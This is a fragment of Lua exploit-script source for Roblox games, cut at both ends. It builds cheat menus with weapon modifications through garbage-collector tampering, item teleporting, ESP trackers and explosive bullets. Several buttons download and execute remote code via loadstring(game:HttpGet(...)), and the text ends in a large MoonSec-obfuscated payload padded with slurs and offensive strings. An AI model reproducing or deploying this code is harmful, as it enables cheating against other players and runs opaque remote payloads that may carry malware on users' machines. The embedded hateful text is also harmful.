				["M1014"] = CFrame.new(-0.356999993, 0.414999992, 1.35000002, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["Magnum"] = CFrame.new(-0.456200004, 0.262400001, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["P90"] = CFrame.new(-0.364499986, 0.0500000007, 1.5, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["SCARL"] = CFrame.new(-0.352499992, 0.218999997, 0.600000024, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["SPAS12"] = CFrame.new(-0.349999994, 0.375, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["AWP"] = CFrame.new(-0.354999989, 0.451000005, 0.800000012, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["Minigun"] = CFrame.new(-0.364499986, 0.0500000007, 1.5, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["Deagle"] = CFrame.new(-0.453000009, 0.601499975, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["PPSH41"] = CFrame.new(-0.353500009, 0.40200001, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1),
			}

			local gc = getgc(true)
			spawn(function()
				while library do
					wait(2)
					for _,v in next, gc do
						if type(v) == "table" and rawget(v, "aimoffset") then
							for i,v2 in next, AimOffsets do
								if v2 == v.aimoffset and library then
									v.rpm = library.flags[GameTitle .. " Quickfire"] and 9e9 or OldWeaponValues[i].rpm
									v.auto = library.flags[GameTitle .. " Automatic Weapons"] and true or OldWeaponValues[i].auto
									v.recoil = library.flags[GameTitle .. " No Recoil"] and 0 or OldWeaponValues[i].recoil
									v.spread = library.flags[GameTitle .. " No Spread"] and 0 or OldWeaponValues[i].spread
									v.reloadtime = library.flags[GameTitle .. " Fast Reload"] and 0 or OldWeaponValues[i].reloadtime
									v.walkspeed = library.flags[GameTitle .. " Speed"] and library.flags[GameTitle .. " Speed Amount"] or OldWeaponValues[i].walkspeed
									v.runspeed = library.flags[GameTitle .. " Speed"] and library.flags[GameTitle .. " Speed Amount"] or OldWeaponValues[i].runspeed
								end
							end
						end
					end
				end
			end)

			local WeaponMods = DZColumn1:AddSection"Weapon Mods"
			WeaponMods:AddToggle({text = "No Recoil"})
			WeaponMods:AddToggle({text = "No Spread"})
			WeaponMods:AddToggle({text = "Quickfire"})
			WeaponMods:AddToggle({text = "Fast Reload"})
			WeaponMods:AddToggle({text = "Automatic Weapons"})

			local Teleporting
			local function TeleportTo(Position)
				if Teleporting then return end
				Teleporting = true
				local Char = Players[Client].Character
				Char = Char and FFC(Char, "HumanoidRootPart")
				if Char then
					local Pos = Char.Position
					Char.Anchored = true
					local step = 20
					for i=1,step do
						Char.CFrame = CFrame.new(Vector3.new(Pos.X, 3000, Pos.Z), Char.CFrame.LookVector):lerp(Char.CFrame, step)
					end
					for i=1,step do
						Char.CFrame = CFrame.new(Vector3.new(Position.X, 3000, Position.Z), Char.CFrame.LookVector):lerp(Char.CFrame, step)
					end
					for i=1,step do
						Char.CFrame = CFrame.new(Position, Char.CFrame.LookVector):lerp(Char.CFrame, step)
					end
					--[[
					wait(1)
					Char.CFrame = CFrame.new(Vector3.new(Position.X, 2000, Position.Z), Char.CFrame.LookVector)
					wait(1)
					Char.CFrame = CFrame.new(Vector3.new(Pos.X, 2000, Pos.Z), Char.CFrame.LookVector)
					wait(1)
					Char.CFrame = CFrame.new(Pos, Char.CFrame.LookVector)
					--]]
					Char.Anchored = false
					wait(1)
				end
				Teleporting = false
			end

			
			local function BringItems(Type, Name)
				for _, v in next, workspace.Items:GetChildren() do
					if v.Config.Type.Value == Type then
						if Name then
							if Type == "Attachment" then
								if not FFC(v.Config.GunsCompatibility, Name) then
									continue
								end
							else
								if not v.Config.ItemName.Value:find(Name) then
									continue
								end
							end
						end
						TeleportTo(v.MainPart.Position)
					end
				end
			end
			
			local WeaponItems = {
				"M1911", "Beretta", "Magnum", "Deagle", 
				"M1014", "SPAS-12", "870MCS",
				"P90", "PPSh-41", "AS Val", "M16", "SCAR-L", "AUG", "ACW-R",
				"Minigun", "AWP"
			}

			local ItemTab = DZColumn1:AddSection"Items"
			ItemTab:AddButton({text = "Bring Consumables", callback = function()
				BringItems"Consumable"
			end})

			ItemTab:AddList({text = "Weapons", skipflag = true, value = "", values = WeaponItems, max = 10, callback = function()
				BringItems("Weapon", Value)
			end})
			ItemTab:AddButton({text = "Bring Ammo", callback = function()
				BringItems("Ammo", library.flags[GameTitle .. " Weapons"])
			end})
			ItemTab:AddButton({text = "Bring Comp. Attachments", callback = function()
				BringItems("Attachment", library.flags[GameTitle .. " Weapons"])
			end})

			ItemTab:AddList({text = "Helmets", skipflag = true, value = "", values = {"Civilian", "Military", "Spec Ops", "Gas Mask", "Night Vision"}, callback = function(Value)
				BringItems("Helmet", Value)
			end})

			ItemTab:AddList({text = "Vests", skipflag = true, value = "", values = {"Civilian", "Military", "Spec Ops"}, callback = function(Value)
				BringItems("Vest", Value)
			end})

			ItemTab:AddList({text = "Backpacks", skipflag = true, value = "", values = {"Civilian", "Military", "Spec Ops"}, callback = function(Value)
				BringItems("Backpack", Value)
			end})
			--]]

		elseif GameTitle == "R2DA" then

			AddTracker(workspace.Characters.Zombies)

		elseif GameTitle == "Zombie Uprising" then

			local ZUprisingTab = library:AddTab"Zombie Uprising"
			local ZUprisingColumn = ZUprisingTab:AddColumn()

			local ZUprisingMain = ZUprisingColumn:AddSection"Main"
			local WeaponMods = ZUprisingColumn:AddSection"Weapon Mods"

			AddTracker(workspace.Zombies)
			AddTracker(workspace.Map.BossFolder)

		end
	end)

	library.flagprefix = nil

	if VisualsTab.canInit then
		AddTracker(PlayerServ)
	end

	--Always running
	library:AddConnection(runService.RenderStepped, function()
		local MX, MY = Mouse.X, Mouse.Y + 36
		if library.flags["Mouse Offset"] then
			MX = MX + library.flags["MXO Amount"]
			MY = MY + library.flags["MYO Amount"]
		end

		if Draw.Visible then
			Draw.Position = Vector2.new(MX, MY)
		end

		--if RadarWindow.Visible then
		--	RadarWindow.Position = Vector2.new(MX, MY)
		--end

		if CrosshairBottom.Visible then
			local Thickness = library.flags["Crosshair Thickness"] / 2
			local TX, TY = MX - Thickness, MY - Thickness
			CrosshairTop.Position = Vector2.new(TX, MY - library.flags["Crosshair Gap"])
			CrosshairLeft.Position = Vector2.new(MX - library.flags["Crosshair Gap"], TY)
			CrosshairRight.Position = Vector2.new(MX + library.flags["Crosshair Gap"], TY)
			CrosshairBottom.Position = Vector2.new(TX, MY + library.flags["Crosshair Gap"])
		end
		
		Lighting.ClockTime = library.flags["Clock Time"] and library.flags["Clock Time Amount"] or LightingSpoof.ClockTime
		Lighting.Brightness = library.flags["Brightness"] and library.flags["Brightness Amount"] or LightingSpoof.Brightness
		Lighting.Ambient = library.flags["Ambient Lighting"] and library.flags["Indoor Ambient"] or LightingSpoof.Ambient
		Lighting.OutdoorAmbient = library.flags["Ambient Lighting"] and library.flags["Outdoor Ambient"] or LightingSpoof.OutdoorAmbient
		Lighting.ColorShift_Top = library.flags["Color Shift"] and library.flags["Color Shift Top"] or LightingSpoof.ColorShift_Top

		Camera.FieldOfView = (library.flags["FOV Zoom Enabled"] and library.flags["FOV Zoom Key"] and (50 - library.flags["FOV Zoom Amount"])) or library.flags["FOV Changer"] and (library.flags["Dynamic Custom FOV"] and (CameraSpoof.FieldOfView + library.flags["FOV Amount"]) or library.flags["FOV Amount"]) or CameraSpoof.FieldOfView
	end)

	library:Init()

	delay(1, function() library:LoadConfig(tostring(getgenv().autoload)) end)

	if not getgenv().silent then
		if Loaded then
			library:SendNotification(5, "Loaded " .. (GameTitle or "universal features") .. " successfully")
		else
			library:SendNotification(5, "Failed to load " .. (GameTitle or "universal features") .. " (error copied to clipboard)")
			setclipboard(LoadError)
		end
	end

	if not library:GetConfigs()[1] then
		writefile(library.foldername .. "/Default" .. library.fileext, loadstring(game:HttpGet("https://raw.githubusercontent.com/Jan5106/uwuware_final/main/default_config.lua", true))())
		library.options["Config List"]:AddValue"Default"
		library:LoadConfig"Default"
	end
end)
  	end    
})
ArmaTab:AddButton({
	Name = "Bala Explosiva",
	Callback = function()
        for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetDescendants()) do
			if v:IsA("ModuleScript") and v.Name == "Settings" then
				local a = require(v)	
				a.ExplosiveHit = true
				a.Expradius = 50
			end
		end
  	end    
})
local Section = MenusTab:AddSection({
	Name = "Menus"
})
    MenusTab:AddButton({
        Name = "Felipe Menu (!)",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/DebugCrazY/FMobfuscated/main/fm.lua'))()
          end    
})
    MenusTab:AddButton({
        Name = "Felipe Menu (Cidade alta)",
        Callback = function()
            _, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'


,nil,nil;(function() _msec=(function(e,l,o)local W=l["㒢㒥㒛㒣㒤㒝㒛㒡㒗㒠"];local R=o[e[(666+-#{1,{};82;82,'nil'})]][e["㒜㒡㒜㒗㒟㒞㒙㒢㒝㒙㒟㒚㒥㒗㒞㒡㒡㒞"]];local p=(0x49+-69)/(20/(1440/(407-0x107)))local S=(((0x8a1600/128)/175)/202)-(0x4/4)local v=o[e[(0x1aa-((0x23b-297)+-#'keno 0347 is a nerdy fag'))]][e["㒙㒘㒣㒙㒣㒢㒙㒡㒜㒣㒛㒙㒢"]];local m=(-#'how to join the kkk'+((-#"free bobux no skem"+(1892+(((0x15+-26)+-#[[papier ist ein kleiner schwanz lutscher]])-30)))/0x5a))+(38-0x24)local C=o[e[((0x4b1+-46)-0x263)]][e["㒜㒝㒠㒞㒚㒜㒗㒥㒟㒤㒗㒥㒛㒗㒘㒜㒝"]]local d=((0x906/165)+-#'deadphonelua')-((61+((-#'elbicho'+(-1860/0xba))+-23))+-#'Cock and ball tortue')local r=(5+-#{(function()return#{('fhKPKl'):find("\75")}>0 and 1 or 0 end),11,(function()return#{('fhKPKl'):find("\75")}>0 and 1 or 0 end)})local x=(70/((-#'monkey mode'+((0x4cf2/42)-0x107))-160))local w=(120-(((0x235-(-0x57+428))+-#'If LocalPlayer equals Dumbass then while true do end')+-0x36))local i=((88+-#{(function()return{','}end)();24,(function()return#{('bmHfML'):find("\72")}>0 and 1 or 0 end);24;",",87;'}'})-0x4f)local b=(-0x5f+(-116+(217+-#{'nil',(function()return{','}end)(),24;24})))local O=(((58+-#{(function()return{','}end)(),1,'nil';'nil';59})-46)+-#[[Negro]])local k=(80-(-0x2b+(-#"Deezbutts"+(187+(-#'this is a meme string'+(-0x3c2/26))))))local U=((-#{'}',",",61;(function()return{','}end)()}+54)-47)local h=((-#"anime is for fags"+(56-((9579/(110+-#{1,1,{},",",'nil';'nil',(function()return#{('FhbPbH'):find("\98")}>0 and 1 or 0 end)}))+-#[[W4rboy was here]])))+0x2a)local u=(0x1b0/(29376/(((-#'Impulse real 2022'+(-4118/0x47))+301)+-#'windows xp startup sfx')))local c=(129+(-80+(((-0xb99+1473)/0x2c)+-#"Lana Rhoades")))local t=(((-0xb-((-112+(36322/0xb))/0x6e))+-#'cilerteddoesntlikeburgers')+0x44)local B=(((336-(-#'cilerteddoesntlikeburgers'+(15870/(-#"send nudes"+(0xbb-(0x1b6c/65))))))+-#[[bigchungus]])-117)local P=(((2029-((-#{23,1,23;23,(function()return#{('Lkmpfb'):find("\109")}>0 and 1 or 0 end)}+257009)/242))+-#"elbicho")/0xf0)local N=((((-0x6d+1)+0xf1)-0x53)-46)local M=(112-((-0x55+(26984+-#{'}',1;1,(function()return#{('FFFMLl'):find("\70")}>0 and 1 or 0 end),",",'}',(function()return{','}end)()}))/249))local D=(((0x3aa+(((-0x76+-10130)/168)+-0xd))+-#"never gonna give you up never gonna let you down")/204)local _=((((-#{(function()return{','}end)();(function()return#{('pKKfLP'):find("\75")}>0 and 1 or 0 end),'nil','}',44,'nil';1}+341)+-97)-181)-52)local j=e[(-#{'nil','}',(function()return{','}end)();68;105,68,","}+1395)];local G=o[e[(183+-#{",";'}',(function()return{','}end)();(function()return#{('HBhHMB'):find("\104")}>0 and 1 or 0 end),82,(function()return#{('HBhHMB'):find("\104")}>0 and 1 or 0 end);'}'})]][e["㒟㒡㒟㒣㒣㒣㒠㒤㒛㒤㒦㒙㒡㒘"]];local L=o[(function(e)return type(e):sub(1,1)..'\101\116'end)('㒛㒚㒤㒦㒦㒝㒠㒞')..'\109\101'..('\116\97'or'㒟㒗㒠㒥㒘㒢㒚㒡')..e[(0x458-568)]];local F=o[e[(-0x2d+589)]][e["㒣㒜㒟㒡㒚㒘㒤㒛"]];local A=(7+-#{(function()return#{('pKOflb'):find("\79")}>0 and 1 or 0 end),'nil','nil';59;'nil'})-(-#"0nly 1337"+(((420-0xfa)+-118)+-41))local y=(42/(-#[[nicowashere]]+(((13989-0x1b5b)+-#'bigchungus')/218)))-(270/0x87)local I=o[e[(-#'atakan der nigga'+(0x138+-120))]][e["㒝㒣㒝㒢㒠㒙㒡㒚"]];local a=function(e,o)return e..o end local z=(388/0x61)*(77-((16000/((6900800/0xe3)/0xbe))+-#[[if syn then haxor alert end]]))local K=o[e["㒡㒞㒥㒟㒙㒠㒠㒢㒜㒘㒤㒙㒛㒣㒚"]];local f=(0x2c+-42)*((-0x18+((-0x2df/105)+-#'W4rboy was here'))+0xae)local H=((2180-0x475)+-#[[W4rboy was here]])*(((-#"0nly segc"+((0x54aad/93)+-93))/0x75)+-#"Fucking losed 027728272728271")local V=((-0x36+(36844/0x97))-0x8a)local g=((((4641/0x77)+-#"cilerteddoesntlikeburgers")-0x2f)+0x23)*(-#"bigchungus"+(51-0x27))local s=o[e["㒝㒛㒠㒥㒠㒝㒠㒙㒟㒣㒛㒞㒥㒝㒗㒗㒠㒥㒛"]]or o[e[(68000/0x7d)]][e["㒝㒛㒠㒥㒠㒝㒠㒙㒟㒣㒛㒞㒥㒝㒗㒗㒠㒥㒛"]];local n=((((-49+0x34045)-106516)/52)/0x8)local e=o[e["㒤㒗㒝㒗㒦㒝㒞㒢㒣㒚㒣㒤"]];local Y=(function(a)local r,l=3,0x10 local o={j={},v={}}local n=-d local e=l+S while true do o[a:sub(e,(function()e=r+e return e-S end)())]=(function()n=n+d return n end)()if n==(z-d)then n=""l=A break end end local n=#a while e<n+S do o.v[l]=a:sub(e,(function()e=r+e return e-S end)())l=l+d if l%p==A then l=y F(o.j,(I((o[o.v[y]]*z)+o[o.v[d]])))end end return C(o.j)end)("..:::MoonSec::..㒗㒘㒙㒚㒛㒜㒝㒞㒟㒠㒡㒢㒣㒤㒥㒦㒢㒛㒡㒙㒠㒥㒠㒡㒠㒞㒠㒙㒟㒥㒟㒡㒟㒝㒟㒙㒞㒥㒞㒡㒞㒣㒞㒙㒝㒥㒝㒡㒥㒛㒝㒝㒜㒥㒜㒡㒜㒝㒣㒠㒡㒦㒢㒚㒢㒡㒠㒝㒛㒛㒚㒡㒚㒝㒚㒙㒞㒝㒠㒠㒠㒙㒟㒝㒟㒚㒟㒣㒘㒝㒘㒟㒗㒥㒗㒡㒗㒝㒜㒙㒜㒦㒝㒣㒜㒢㒝㒗㒝㒙㒘㒛㒥㒤㒥㒙㒤㒥㒤㒡㒙㒣㒚㒢㒛㒘㒚㒚㒙㒟㒙㒥㒙㒚㒢㒣㒢㒝㒚㒙㒡㒦㒢㒝㒡㒝㒡㒙㒠㒥㒠㒡㒢㒚㒠㒙㒟㒥㒟㒡㒟㒝㒟㒙㒞㒥㒞㒡㒠㒝㒞㒙㒝㒥㒝㒡㒝㒝㒝㒙㒜㒥㒜㒤㒜㒝㒞㒙㒛㒥㒛㒡㒛㒝㒛㒙㒚㒥㒚㒡㒚㒠㒚㒙㒛㒥㒙㒡㒙㒝㒙㒙㒘㒥㒘㒡㒘㒝㒘㒛㒗㒥㒚㒡㒗㒝㒗㒙㒦㒥㒦㒡㒦㒡㒦㒙㒦㒛㒥㒡㒦㒟㒥㒙㒤㒥㒤㒡㒤㒝㒤㒚㒣㒥㒣㒡㒣㒝㒣㒙㒢㒥㒢㒡㒢㒞㒢㒙㒡㒦㒡㒡㒡㒝㒡㒙㒠㒥㒠㒡㒠㒝㒠㒙㒟㒥㒟㒣㒟㒝㒟㒚㒞㒥㒞㒡㒞㒝㒞㒙㒝㒥㒝㒡㒝㒝㒝㒙㒜㒥㒜㒡㒞㒝㒜㒙㒛㒥㒛㒡㒛㒝㒛㒙㒚㒥㒚㒤㒚㒝㒝㒙㒙㒥㒙㒡㒙㒝㒙㒙㒙㒙㒘㒡㒘㒢㒘㒙㒗㒥㒗㒡㒗㒝㒗㒙㒦㒥㒦㒢㒦㒝㒦㒙㒥㒥㒥㒡㒥㒤㒥㒙㒤㒥㒤㒡㒗㒗㒤㒟㒣㒥㒣㒡㒣㒝㒘㒙㒘㒦㒙㒣㒘㒢㒙㒗㒙㒙㒜㒙㒡㒥㒡㒙㒠㒥㒠㒡㒤㒦㒗㒗㒗㒘㒦㒥㒥㒞㒦㒗㒥㒘㒤㒦㒘㒥㒟㒚㒝㒥㒝㒡㒝㒝㒡㒦㒣㒤㒣㒦㒣㒠㒢㒞㒠㒗㒢㒦㒢㒡㒢㒝㒡㒤㒡㒟㒝㒞㒞㒜㒠㒡㒠㒚㒟㒠㒟㒤㒦㒗㒘㒤㒘㒝㒘㒙㒗㒥㒞㒟㒝㒢㒞㒠㒙㒟㒗㒘㒦㒝㒦㒙㒥㒥㒙㒤㒜㒜㒜㒗㒛㒣㒚㒦㒚㒠㒛㒝㒞㒝㒤㒜㒣㒝㒣㒙㒢㒥㒗㒝㒙㒜㒘㒜㒗㒦㒘㒝㒦㒠㒗㒜㒘㒗㒗㒚㒗㒝㒗㒝㒠㒘㒙㒛㒘㒦㒘㒢㒘㒞㒘㒚㒗㒦㒙㒢㒡㒤㒞㒟㒝㒝㒝㒙㒜㒥㒝㒣㒠㒡㒜㒙㒛㒥㒛㒡㒛㒟㒛㒙㒚㒥㒚㒡㒜㒝㒚㒙㒙㒥㒙㒡㒙㒝㒙㒙㒘㒥㒘㒥㒘㒝㒙㒛㒗㒥㒗㒡㒗㒞㒗㒙㒗㒛㒦㒡㒦㒝㒦㒙㒥㒥㒥㒡㒥㒝㒥㒛㒤㒥㒤㒡㒤㒝㒤㒙㒣㒥㒣㒡㒣㒝㒣㒙㒢㒥㒢㒡㒢㒟㒢㒙㒢㒗㒡㒡㒢㒟㒡㒙㒠㒥㒠㒢㒠㒝㒠㒠㒟㒥㒟㒡㒟㒝㒡㒙㒞㒥㒞㒡㒞㒟㒞㒙㒝㒥㒝㒡㒝㒞㒝㒙㒞㒥㒜㒡㒜㒝㒜㒛㒛㒥㒛㒣㒛㒝㒛㒜㒚㒥㒜㒡㒚㒝㒚㒙㒚㒗㒙㒡㒙㒟㒙㒙㒙㒚㒘㒡㒘㒣㒘㒝㒗㒥㒗㒥㒗㒝㒗㒙㒦㒥㒦㒢㒦㒝㒦㒛㒥㒥㒥㒡㒘㒥㒥㒙㒤㒥㒤㒡㒤㒝㒤㒙㒣㒥㒣㒡㒣㒝㒦㒡㒢㒥㒢㒡㒢㒝㒢㒚㒡㒥㒡㒡㒡㒝㒡㒙㒗㒞㒠㒡㒠㒟㒠㒙㒠㒙㒟㒡㒟㒞㒟㒙㒞㒥㒤㒚㒞㒝㒞㒙㒝㒥㒝㒢㒝㒝㒝㒙㒜㒥㒜㒡㒜㒞㒜㒙㒛㒥㒛㒡㒛㒝㒛㒙㒚㒥㒚㒡㒚㒣㒚㒙㒙㒥㒙㒡㒡㒝㒙㒙㒦㒗㒘㒦㒘㒝㒘㒙㒗㒥㒛㒢㒝㒟㒞㒛㒝㒞㒝㒣㒣㒟㒦㒠㒥㒥㒥㒡㒥㒝㒚㒟㒛㒞㒛㒤㒚㒦㒚㒛㒚㒡㒙㒦㒠㒡㒣㒚㒢㒥㒣㒗㒢㒝㒢㒙㒡㒥㒦㒡㒗㒞㒘㒛㒗㒚㒗㒟㒗㒡㒘㒗㒠㒙㒟㒡㒟㒝㒟㒙㒦㒜㒤㒢㒤㒦㒥㒝㒞㒥㒝㒡㒝㒝㒝㒙㒜㒥㒣㒘㒜㒝㒜㒙㒛㒥㒛㒡㒛㒝㒛㒙㒚㒥㒜㒡㒚㒝㒚㒙㒙㒥㒙㒡㒙㒝㒙㒙㒙㒚㒘㒡㒚㒝㒘㒙㒗㒥㒗㒡㒗㒝㒗㒙㒦㒥㒦㒦㒦㒝㒘㒙㒥㒥㒥㒡㒥㒝㒥㒙㒤㒥㒤㒡㒤㒢㒤㒙㒦㒥㒣㒡㒣㒝㒣㒙㒢㒥㒢㒤㒢㒝㒢㒚㒡㒥㒢㒣㒡㒝㒡㒙㒠㒥㒠㒡㒠㒣㒠㒙㒟㒥㒟㒡㒟㒝㒟㒙㒞㒥㒞㒢㒞㒝㒞㒚㒝㒥㒝㒡㒝㒝㒝㒙㒜㒥㒜㒡㒜㒝㒜㒙㒜㒗㒛㒡㒛㒞㒛㒙㒚㒥㒚㒡㒚㒝㒚㒙㒙㒥㒙㒡㒙㒝㒙㒙㒘㒥㒚㒡㒘㒝㒘㒙㒗㒥㒗㒡㒗㒝㒗㒙㒗㒚㒦㒡㒘㒝㒦㒙㒥㒥㒥㒡㒥㒝㒥㒙㒤㒥㒤㒦㒤㒝㒦㒙㒣㒥㒣㒡㒣㒝㒣㒙㒢㒥㒢㒡㒢㒢㒢㒙㒣㒥㒡㒡㒡㒝㒡㒙㒠㒥㒠㒡㒠㒝㒠㒞㒟㒥㒡㒡㒟㒝㒟㒙㒞㒥㒞㒡㒞㒝㒞㒙㒞㒗㒝㒡㒠㒝㒝㒙㒜㒥㒜㒡㒜㒝㒜㒜㒛㒥㒛㒥㒛㒝㒛㒙㒚㒥㒚㒡㒚㒝㒚㒙㒙㒦㒙㒡㒙㒝㒙㒙㒘㒥㒙㒘㒘㒝㒘㒙㒗㒥㒟㒢㒚㒠㒚㒜㒚㒘㒙㒤㒙㒠㒙㒜㒣㒘㒙㒠㒝㒛㒥㒡㒤㒥㒤㒡㒤㒝㒘㒢㒚㒣㒚㒤㒚㒡㒙㒚㒙㒣㒘㒤㒘㒢㒗㒝㒢㒠㒡㒡㒡㒝㒡㒙㒥㒡㒗㒠㒦㒠㒦㒚㒦㒡㒤㒤㒥㒠㒦㒛㒥㒞㒥㒡㒥㒡㒘㒡㒞㒘㒝㒡㒝㒝㒝㒙㒣㒣㒢㒦㒣㒤㒦㒡㒜㒛㒛㒡㒛㒝㒛㒙㒟㒥㒠㒢㒡㒟㒠㒞㒠㒣㒠㒥㒞㒡㒙㒠㒘㒥㒘㒡㒘㒝㒜㒜㒞㒤㒞㒟㒞㒛㒝㒞㒝㒘㒝㒥㒦㒝㒗㒚㒥㒥㒥㒡㒥㒝㒙㒦㒛㒤㒛㒦㒛㒠㒚㒞㒘㒗㒚㒦㒚㒡㒚㒝㒙㒤㒙㒟㒥㒞㒦㒜㒘㒡㒘㒚㒗㒠㒗㒤㒡㒣㒠㒡㒠㒝㒠㒙㒡㒗㒣㒥㒟㒝㒟㒙㒞㒥㒞㒣㒞㒝㒞㒙㒝㒥㒟㒡㒝㒝㒝㒙㒜㒥㒜㒡㒜㒝㒜㒙㒜㒙㒛㒡㒜㒟㒛㒙㒚㒥㒚㒢㒚㒝㒚㒜㒙㒥㒙㒡㒙㒝㒙㒙㒘㒥㒘㒡㒘㒟㒘㒙㒗㒥㒗㒡㒗㒝㒗㒙㒦㒥㒦㒡㒦㒝㒦㒙㒥㒥㒥㒣㒥㒝㒥㒛㒤㒥㒥㒣㒤㒝㒤㒙㒣㒦㒣㒡㒣㒞㒣㒙㒢㒥㒢㒡㒤㒝㒢㒙㒡㒥㒡㒣㒡㒝㒡㒙㒠㒥㒠㒦㒠㒝㒢㒙㒟㒥㒟㒡㒟㒟㒟㒙㒟㒗㒞㒡㒞㒤㒞㒙㒟㒥㒝㒡㒝㒝㒝㒛㒜㒥㒜㒣㒜㒝㒜㒟㒛㒥㒜㒗㒛㒡㒛㒙㒛㒙㒚㒡㒚㒝㒚㒙㒙㒦㒙㒡㒙㒟㒙㒙㒘㒥㒜㒙㒘㒝㒘㒙㒗㒥㒗㒡㒗㒝㒗㒙㒦㒥㒦㒡㒙㒥㒦㒙㒥㒥㒥㒡㒥㒞㒥㒙㒤㒥㒤㒡㒤㒝㒚㒢㒣㒥㒣㒣㒣㒝㒣㒝㒢㒥㒢㒢㒢㒝㒢㒙㒗㒞㒡㒡㒡㒝㒡㒙㒠㒦㒠㒡㒠㒝㒠㒙㒟㒥㒟㒢㒟㒝㒟㒙㒞㒥㒞㒡㒞㒝㒞㒙㒝㒥㒝㒣㒝㒝㒝㒙㒜㒥㒡㒥㒙㒘㒜㒙㒛㒥㒛㒡㒢㒙㒢㒘㒠㒦㒠㒥㒡㒠㒡㒝㒡㒗㒠㒚㒠㒛㒟㒠㒛㒝㒟㒘㒞㒞㒞㒦㒞㒚㒛㒛㒛㒥㒞㒝㒞㒙㒝㒡㒚㒤㒜㒞㒝㒙㒘㒙㒗㒥㒗㒠㒛㒝㒛㒥㒛㒡㒛㒙㒛㒘㒗㒛㒦㒜㒦㒘㒙㒜㒙㒚㒙㒠㒙㒝㒤㒣㒘㒘㒗㒦㒘㒝㒗㒝㒗㒦㒦㒟㒗㒞㒗㒘㒥㒦㒦㒟㒥㒜㒥㒤㒥㒟㒥㒡㒤㒞㒤㒣㒤㒥㒠㒛㒣㒜㒣㒤㒣㒞㒟㒜㒢㒦㒢㒚㒢㒠㒣㒗㒢㒘㒡㒣㒠㒦㒟㒦㒟㒝㒜㒤㒟㒣㒟㒣㒜㒙㒜㒘㒜㒘㒞㒡㒞㒟㒞㒛㒛㒚㒝㒣㒚㒙㒜㒦㒚㒘㒙㒝㒙㒙㒘㒦㒙㒘㒘㒠㒘㒙㒘㒙㒚㒥㒚㒡㒚㒝㒗㒛㒗㒘㒙㒣㒙㒝㒙㒘㒘㒥㒥㒠㒥㒠㒤㒥㒤㒠㒘㒟㒗㒚㒘㒜㒣㒠㒦㒢㒣㒚㒣㒙㒥㒦㒢㒤㒢㒝㒥㒛㒡㒥㒡㒟㒡㒞㒤㒗㒠㒡㒠㒣㒠㒙㒣㒙㒣㒗㒟㒢㒟㒛㒟㒘㒞㒤㒞㒡㒞㒜㒡㒘㒡㒗㒝㒠㒝㒙㒠㒗㒝㒘㒜㒥㒜㒠㒛㒥㒜㒘㒛㒡㒞㒞㒞㒗㒚㒤㒝㒠㒚㒞㒝㒙㒙㒣㒙㒜㒜㒚㒝㒗㒛㒤㒛㒢㒜㒞㒜㒘㒦㒦㒗㒟㒗㒞㒗㒗㒦㒡㒚㒥㒥㒞㒦㒗㒥㒦㒥㒟㒥㒙㒘㒛㒘㒝㒘㒦㒣㒞㒤㒗㒣㒦㒣㒟㒣㒙㒣㒗㒡㒦㒢㒟㒢㒞㒢㒗㒡㒡㒥㒜㒤㒛㒤㒛㒤㒝㒤㒢㒣㒜㒢㒦㒣㒥㒣㒜㒣㒛㒞㒜㒞㒚㒞㒙㒢㒝㒢㒗㒡㒦㒠㒢㒜㒢㒜㒞㒜㒙㒛㒦㒙㒣㒙㒟㒛㒛㒙㒗㒘㒙㒗㒥㒗㒡㒞㒙㒞㒘㒜㒦㒜㒥㒝㒠㒝㒝㒝㒗㒜㒚㒜㒛㒛㒠㒥㒚㒤㒡㒤㒝㒤㒙㒥㒗㒗㒛㒣㒝㒣㒙㒢㒥㒢㒣㒢㒝㒢㒙㒡㒥㒢㒣㒡㒝㒡㒙㒠㒦㒠㒡㒠㒞㒠㒙㒟㒥㒟㒡㒟㒝㒟㒙㒞㒥㒞㒡㒞㒝㒞㒛㒝㒥㒝㒣㒝㒝㒝㒙㒜㒥㒜㒡㒜㒝㒜㒙㒛㒦㒛㒡㒛㒞㒛㒙㒚㒥㒚㒡㒚㒝㒚㒙㒙㒥㒙㒢㒙㒝㒙㒙㒘㒥㒘㒡㒘㒣㒘㒙㒗㒥㒗㒡㒜㒡㒗㒟㒦㒥㒦㒡㒦㒝㒛㒙㒛㒦㒜㒣㒛㒢㒜㒗㒜㒙㒟㒙㒤㒥㒤㒙㒣㒥㒣㒡㒗㒦㒚㒗㒚㒘㒙㒥㒘㒞㒙㒗㒘㒘㒗㒦㒡㒝㒡㒠㒠㒥㒠㒡㒠㒝㒤㒜㒦㒤㒦㒟㒦㒛㒥㒞㒥㒘㒥㒥㒡㒗㒞㒜㒝㒥㒝㒡㒝㒝㒤㒗㒣㒚㒤㒘㒤㒛㒜㒤㒛㒥㒛㒡㒛㒝㒟㒥㒡㒤㒠㒤㒠㒞㒠㒥㒟㒘㒟㒤㒠㒟㒟㒢㒟㒥㒟㒥㒠㒛㒙㒚㒗㒥㒗㒡㒗㒝㒛㒦㒝㒤㒝㒦㒝㒠㒜㒞㒚㒗㒜㒦㒜㒡㒜㒝㒛㒤㒛㒟㒗㒞㒘㒜㒚㒡㒚㒚㒙㒠㒙㒤㒣㒠㒢㒡㒢㒝㒢㒙㒣㒗㒚㒦㒡㒝㒡㒙㒠㒥㒠㒣㒠㒝㒠㒙㒟㒥㒡㒡㒟㒝㒟㒙㒞㒥㒞㒡㒞㒝㒞㒙㒞㒙㒝㒡㒞㒟㒝㒙㒜㒥㒜㒢㒜㒝㒜㒞㒛㒥㒛㒡㒛㒝㒛㒙㒚㒥㒚㒡㒚㒟㒚㒙㒙㒥㒙㒡㒙㒝㒙㒙㒘㒥㒘㒡㒘㒝㒘㒙㒗㒥㒗㒣㒗㒝㒗㒛㒦㒥㒘㒡㒦㒝㒦㒙㒥㒦㒥㒡㒥㒝㒥㒙㒤㒦㒤㒡㒦㒝㒤㒙㒣㒥㒣㒢㒣㒝㒣㒚㒢㒥㒣㒗㒢㒝㒤